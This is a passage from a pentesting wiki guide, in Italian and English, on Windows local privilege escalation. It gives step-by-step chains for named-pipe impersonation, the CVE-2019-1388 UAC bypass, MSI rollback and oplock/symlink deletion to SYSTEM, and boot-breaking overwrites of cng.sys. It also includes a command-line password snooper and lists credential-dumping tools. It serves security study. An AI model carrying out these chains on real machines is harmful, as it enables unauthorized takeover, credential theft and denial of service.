Quando i dati vengono inviati attraverso una pipe da un **client**, il **server** che ha creato la pipe ha la capacità di **assumere l'identità** del **client**, a condizione di possedere i diritti **SeImpersonate**. Identificare un **privileged process** che comunica tramite una pipe che puoi emulare offre l'opportunità di **gain higher privileges** adottando l'identità di quel processo una volta che interagisce con la pipe che hai stabilito. Per istruzioni su come eseguire questo attacco, guide utili possono essere trovate [**qui**](named-pipe-client-impersonation.md) e [**qui**](#from-high-integrity-to-system).

Inoltre il seguente tool permette di **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **e questo tool permette di list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Flusso completo:

- `ClientAttach` con `pszDomainUser` impostato su un percorso esistente scrivibile → il servizio lo apre tramite `CreateFileW(..., OPEN_EXISTING)` e lo usa per scritture di eventi async.
- Ogni evento scrive l'`InitContext` controllato dall'attaccante proveniente da `Initialize` su quel handle. Registra una line app con `LRegisterRequestRecipient` (`Req_Func 61`), innesca `TRequestMakeCall` (`Req_Func 121`), recupera con `GetAsyncEvents` (`Req_Func 0`), poi deregistra/arresta per ripetere scritture deterministiche.
- Aggiungiti a `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, riconnettiti, poi chiama `GetUIDllName` con un percorso DLL arbitrario per eseguire `TSPI_providerUIIdentify` come `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Varie

### File Extensions that could execute stuff in Windows

Dai un'occhiata alla pagina **https://filesec.io/**

### **Monitoraggio delle linee di comando per password**

Quando si ottiene una shell come utente, potrebbero esserci attività pianificate o altri processi in esecuzione che **pass credentials on the command line**. Lo script seguente cattura le command lines dei processi ogni due secondi e confronta lo stato attuale con quello precedente, stampando eventuali differenze.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Rubare password dai processi

## Da Low Priv User a NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Se hai accesso all'interfaccia grafica (via console o RDP) e UAC è abilitato, in alcune versioni di Microsoft Windows è possibile eseguire un terminale o qualsiasi altro processo come "NT\AUTHORITY SYSTEM" partendo da un utente non privilegiato.

Ciò permette di eseguire l'escalation di privilegi e bypassare UAC contemporaneamente con la stessa vulnerabilità. Inoltre, non c'è bisogno di installare nulla e il binario usato durante il processo è firmato e rilasciato da Microsoft.

Alcuni dei sistemi interessati sono i seguenti:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Per eseguire un exploit su questa vulnerability, è necessario eseguire i seguenti passaggi:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## Da Administrator Medium a High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Da Eliminazione/Spostamento/Rinominazione arbitraria di cartelle a SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

L'attacco consiste fondamentalmente nell'abusare della funzionalità di rollback di Windows Installer per sostituire file legittimi con file maligni durante il processo di uninstall. Per questo l'attaccante deve creare un **malicious MSI installer** che verrà usato per hijackare la cartella `C:\Config.Msi`, che poi sarà usata dal Windows Installer per memorizzare i file di rollback durante la disinstallazione di altri pacchetti MSI dove i file di rollback sarebbero stati modificati per contenere il payload maligno.

La tecnica riassunta è la seguente:

1. **Fase 1 – Preparazione per l'Hijack (lasciare `C:\Config.Msi` vuota)**

- Passo 1: Installare l'MSI
- Create un `.msi` che installa un file innocuo (es., `dummy.txt`) in una cartella scrivibile (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, così un **non-admin user** può eseguirlo.
- Tenete aperto un **handle** sul file dopo l'install.

- Passo 2: Iniziare la disinstallazione
- Disinstallate lo stesso `.msi`.
- Il processo di uninstall inizia a spostare i file in `C:\Config.Msi` e a rinominarli in file `.rbf` (backup per il rollback).
- **Poll the open file handle** usando `GetFinalPathNameByHandle` per rilevare quando il file diventa `C:\Config.Msi\<random>.rbf`.

- Passo 3: Sincronizzazione custom
- Il `.msi` include una **custom uninstall action (`SyncOnRbfWritten`)** che:
- Segnala quando `.rbf` è stato scritto.
- Poi **attende** un altro evento prima di proseguire con l'uninstall.

- Passo 4: Bloccare la cancellazione di `.rbf`
- Quando segnalato, **aprite il file `.rbf`** senza `FILE_SHARE_DELETE` — questo **impedisce che venga cancellato**.
- Poi **segnalate indietro** così l'uninstall può terminare.
- Windows Installer non riesce a cancellare il `.rbf`, e poiché non può cancellare tutto il contenuto, **`C:\Config.Msi` non viene rimosso**.

- Passo 5: Cancellare manualmente `.rbf`
- Voi (attaccante) cancellate manualmente il file `.rbf`.
- Ora **`C:\Config.Msi` è vuota**, pronta per essere hijackata.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Fase 2 – Sostituire gli script di rollback con versioni malignhe**

- Passo 6: Ricreare `C:\Config.Msi` con ACL deboli
- Ricreate voi stessi la cartella `C:\Config.Msi`.
- Impostate **weak DACLs** (es., Everyone:F), e **tenete aperto un handle** con `WRITE_DAC`.

- Passo 7: Eseguire un altro install
- Installate di nuovo il `.msi`, con:
- `TARGETDIR`: posizione scrivibile.
- `ERROROUT`: una variabile che forza un failure.
- Questo install verrà usato per scatenare di nuovo il **rollback**, che legge `.rbs` e `.rbf`.

- Passo 8: Monitorare per `.rbs`
- Usate `ReadDirectoryChangesW` per monitorare `C:\Config.Msi` finché non appare un nuovo `.rbs`.
- Catturate il suo filename.

- Passo 9: Sincronizzare prima del rollback
- Il `.msi` contiene una **custom install action (`SyncBeforeRollback`)** che:
- Segnala un evento quando il `.rbs` viene creato.
- Poi **attende** prima di procedere.

- Passo 10: Reapplicare ACL deboli
- Dopo aver ricevuto l'evento `*.rbs created`:
- Il Windows Installer **reapplica ACL forti** a `C:\Config.Msi`.
- Ma poiché avete ancora un handle con `WRITE_DAC`, potete **reapplicare di nuovo ACL deboli**.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Passo 11: Drop Fake `.rbs` and `.rbf`
- Sovrascrivete il file `.rbs` con un **fake rollback script** che dice a Windows di:
- Ripristinare il vostro `.rbf` (malicious DLL) in una **cartella privilegiata** (es., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Depositare il vostro fake `.rbf` contenente una **malicious SYSTEM-level payload DLL**.

- Passo 12: Scatenare il rollback
- Segnalate l'evento di sincronizzazione così l'installer riprende.
- Una **type 19 custom action (`ErrorOut`)** è configurata per **fallire intenzionalmente l'install** in un punto noto.
- Questo causa l'inizio del **rollback**.

- Passo 13: SYSTEM installa la vostra DLL
- Windows Installer:
- Legge il vostro `.rbs` maligno.
- Copia il vostro `.rbf` DLL nella location target.
- Avete ora la vostra **malicious DLL in un percorso caricato da SYSTEM**.

- Passo Finale: Eseguire codice SYSTEM
- Eseguite un trusted **auto-elevated binary** (es., `osk.exe`) che carica la DLL che avete hijackato.
- **Boom**: il vostro codice viene eseguito **come SYSTEM**.


### Da Eliminazione/Spostamento/Rinominazione arbitraria di file a SYSTEM EoP

La tecnica principale del rollback MSI (quella precedente) assume che possiate cancellare una **intera cartella** (es., `C:\Config.Msi`). Ma cosa succede se la vostra vulnerabilità permette solo la **cancellazione arbitraria di file**?

Potete sfruttare gli **NTFS internals**: ogni cartella ha uno hidden alternate data stream chiamato:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Questo stream memorizza i **metadati dell'indice** della cartella.

Quindi, se **elimini lo stream `::$INDEX_ALLOCATION`** di una cartella, NTFS **rimuove l'intera cartella** dal filesystem.

Puoi farlo usando le API standard di eliminazione dei file come:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Anche se stai chiamando un'API di cancellazione di *file*, essa **cancella la cartella stessa**.

### Da Folder Contents Delete a SYSTEM EoP
Cosa succede se la tua primitive non ti permette di cancellare file/cartelle arbitrari, ma **permette la cancellazione del *contenuto* di una cartella controllata dall'attaccante**?

1. Passo 1: Prepara una cartella esca e un file
- Crea: `C:\temp\folder1`
- Al suo interno: `C:\temp\folder1\file1.txt`

2. Passo 2: Posiziona un **oplock** su `file1.txt`
- L'oplock **sospende l'esecuzione** quando un processo privilegiato prova a cancellare `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Passo 3: Attiva il processo SYSTEM (es., `SilentCleanup`)
- Questo processo scansiona le cartelle (es., `%TEMP%`) e prova a eliminare il loro contenuto.
- Quando raggiunge `file1.txt`, l'**oplock si attiva** e passa il controllo al tuo callback.

4. Passo 4: All'interno del callback dell'oplock – reindirizza la cancellazione

- Opzione A: Sposta `file1.txt` altrove
- Questo svuota `folder1` senza rilasciare l'oplock.
- Non eliminare `file1.txt` direttamente — questo rilascierebbe l'oplock prematuramente.

- Opzione B: Converti `folder1` in una **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opzione C: Crea un **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Questo prende di mira lo stream interno di NTFS che memorizza i metadati della cartella — cancellarlo cancella la cartella.

5. Passo 5: Rilasciare l'oplock
- Il processo SYSTEM continua e prova a eliminare `file1.txt`.
- Ma ora, a causa della junction + symlink, sta effettivamente eliminando:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Risultato**: `C:\Config.Msi` viene eliminato da SYSTEM.

### From Arbitrary Folder Create to Permanent DoS

Sfrutta una primitiva che ti permette di **create an arbitrary folder as SYSTEM/admin** — anche se **you can’t write files** o **set weak permissions**.

Crea una **folder** (non un file) con il nome di un **critical Windows driver**, ad esempio:
```
C:\Windows\System32\cng.sys
```
- Questo percorso corrisponde normalmente al driver in modalità kernel `cng.sys`.
- Se lo **pre-crei come cartella**, Windows non riesce a caricare il driver reale all'avvio.
- Poi, Windows prova a caricare `cng.sys` durante l'avvio.
- Vede la cartella, **non riesce a risolvere il driver reale**, e **va in crash o blocca l'avvio**.
- Non c'è **fallback**, e **nessun recupero** senza intervento esterno (es. riparazione dell'avvio o accesso al disco).

### Da percorsi di log/backup privilegiati + OM symlinks a sovrascrittura arbitraria di file / boot DoS

Quando un **servizio privilegiato** scrive log/esportazioni in un percorso letto da una **config scrivibile**, reindirizza quel percorso con **Object Manager symlinks + NTFS mount points** per trasformare la scrittura privilegiata in una sovrascrittura arbitraria (anche **senza** SeCreateSymbolicLinkPrivilege).

**Requisiti**
- La config che memorizza il percorso di destinazione è scrivibile dall'attaccante (es. `%ProgramData%\...\.ini`).
- Capacità di creare un mount point per `\RPC Control` e un OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Un'operazione privilegiata che scrive su quel percorso (log, export, report).

**Esempio di catena**
1. Leggi la config per recuperare la destinazione del log privilegiato, es. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Reindirizza il percorso senza admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Attendere che il componente privilegiato scriva il log (es., admin avvia "send test SMS"). La scrittura ora finisce in `C:\Windows\System32\cng.sys`.
4. Ispeziona l'obiettivo sovrascritto (hex/PE parser) per confermare la corruzione; il riavvio forza Windows a caricare il percorso del driver manomesso → **boot loop DoS**. Questo si generalizza anche a qualsiasi file protetto che un servizio privilegiato aprirà in scrittura.

> `cng.sys` viene normalmente caricato da `C:\Windows\System32\drivers\cng.sys`, ma se esiste una copia in `C:\Windows\System32\cng.sys` può essere tentata per prima, rendendolo un sink DoS affidabile per dati corrotti.



## **Da High Integrity a SYSTEM**

### **Nuovo servizio**

Se stai già eseguendo un processo High Integrity, il **percorso verso SYSTEM** può essere semplice semplicemente **creando ed eseguendo un nuovo servizio**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Quando crei un service binary assicurati che sia un servizio valido o che il binario esegua le azioni necessarie rapidamente, altrimenti verrà terminato dopo 20s se non è un servizio valido.

### AlwaysInstallElevated

Da un processo High Integrity puoi provare a **enable the AlwaysInstallElevated registry entries** e **install** una reverse shell usando un _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Se possiedi quei privilegi di token (probabilmente li troverai in un processo già High Integrity), sarai in grado di **open almost any process** (not protected processes) con il privilegio SeDebug, **copy the token** del processo e creare un **arbitrary process with that token**.\
L'uso di questa tecnica solitamente prevede la selezione di un processo in esecuzione come SYSTEM con tutti i privilegi di token (_sì, è possibile trovare processi SYSTEM senza tutti i privilegi di token_).\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Questa tecnica è usata da meterpreter per escalate in `getsystem`. La tecnica consiste nel **creare una pipe e poi create/abuse a service to write on that pipe**. Poi, il **server** che ha creato la pipe usando il privilegio **`SeImpersonate`** sarà in grado di **impersonate the token** del client della pipe (il service) ottenendo privilegi SYSTEM.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Se riesci a **hijack a dll** che viene **loaded** da un **process** in esecuzione come **SYSTEM** potrai eseguire codice arbitrario con quei permessi. Pertanto Dll Hijacking è utile anche per questo tipo di escalation di privilegi e, inoltre, è molto **more easy to achieve from a high integrity process** poiché avrà **write permissions** sulle cartelle usate per caricare le dll.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Check for misconfigurations and sensitive files (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Check for some possible misconfigurations and gather info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Check for misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information. Use -Thorough in local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extracts crendentials from Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray gathered passwords across domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is a PowerShell ADIDNS/LLMNR/mDNS spoofer and man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Search for known privesc vulnerabilities (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Search for known privesc vulnerabilities (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerates the host searching for misconfigurations (more a gather info tool than privesc) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extracts credentials from lots of softwares (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port of PowerUp to C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Check for misconfiguration (executable precompiled in github). Not recommended. It does not work well in Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Check for possible misconfigurations (exe from python). Not recommended. It does not work well in Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool created based in this post (it does not need accesschk to work properly but it can use it).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Reads the output of **systeminfo** and recommends working exploits (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Reads the output of **systeminfo** andrecommends working exploits (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). To see the installed version of .NET on the victim host you can do:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Riferimenti

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 a SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) e furto dei token del kernel](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Inseguendo la Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Vulnerabilità del file system privilegiato presente in un sistema SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – uso di CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [Un Link al Passato. Abusare dei link simbolici su Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)

{{#include ../../banners/hacktricks-training.md}}
